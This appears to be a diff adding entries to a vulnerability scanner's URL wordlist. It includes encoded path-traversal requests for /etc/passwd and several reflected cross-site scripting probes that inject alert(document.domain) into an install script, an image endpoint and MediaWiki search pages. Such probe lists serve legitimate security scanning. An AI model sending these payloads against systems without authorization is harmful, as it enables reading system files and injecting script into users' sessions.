@@ -222,3 +222,11 @@
 /api/v1/main/flows/{{namespace}}/ordinary
 /api/v1/main/flows/{{namespace}}/configs
 /%5B:local:/etc%5D/passwd
+/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd
+/ui/login
+/owa/
+/api/app-images/logo?color=red%7D%3C%2Fstyle%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3Cstyle%3Ex%7B
+/playground
+/admin/install.php?install=2&db_type=mysqli&hostname=&db_username={{randstr}}&timezone=UTC&db_table_prefix=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+/w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
